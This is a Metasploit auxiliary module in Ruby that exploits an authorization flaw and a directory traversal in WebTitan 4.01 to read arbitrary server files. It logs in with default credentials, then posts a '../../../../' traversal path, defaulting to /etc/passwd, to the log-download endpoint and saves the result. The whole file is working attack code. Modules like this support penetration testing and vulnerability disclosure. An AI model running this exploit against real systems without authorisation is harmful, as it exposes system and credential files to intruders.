##
## This module requires Metasploit: http//metasploit.com/download
## Current source: https://github.com/rapid7/metasploit-framework
###

require 'msf/core'

class MetasploitModule < Msf::Auxiliary
  Rank = GoodRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info={})
    super(update_info(info,
      'Name'           => "WebTitan Authenticated Arbitrary File Read",
      'Description'    => %q{
    This module attempts to download a file from a vulnerable WebTitan instance.

      This module takes advantage of an authorization flaw in WebTitan (tested against
      Version: 4.01 Build 148) as well as a directory traversal attack in order
      to read an arbitrary file from the file system as the user the web server runs as.
      },
      'License'        => "VolatileMinds",
      'Version' => "1",
      'Author'         =>
        [],
      'References'     =>
        [['URL', 'https://gist.github.com/brandonprry/10747603']],
      'Platform'       => ['linux'],
      'Privileged'     => false,
      'DisclosureDate' => "Apr 15 2014"))

      register_options(
      [
        OptString.new('FILEPATH', [ true, 'Path to remote file', '/etc/passwd']),
        OptString.new('USERNAME', [ true, 'Single username', 'administrator']),
        OptString.new('PASSWORD', [ true, 'Single password', 'root']),
        OptString.new('TARGETURI', [ true, 'Relative URI of WebTitan installation', '/'])
      ], self.class)
  end

  def run
    post = {
      'jaction' => 'login',
      'language' => 'en_US',
      'username' => datastore['USERNAME'],
      'password' => datastore['PASSWORD']
    }

    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, 'login-x.php'),
      'method' => 'POST',
      'vars_post' => post
    })

    if res.body !~ /{"success":true,"status":"Success: Changes saved"}/
      fail_with("Authentication failed")
    end

    cookie = res.get_cookies
    post = {
      'jaction' => 'download',
      'logfile' => '../../../../' + datastore['FILEPATH']
    }

    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, 'logs-x.php'),
      'method' => 'POST',
      'cookie' => cookie,
      'vars_post' => post
    })

    vprint_status(res.body)

    path = store_loot('webtitan.file', 'application/octet-stream', datastore['RHOST'], res.body, datastore['FILENAME'])

    print_good("File saved to: " + path)
  end
end

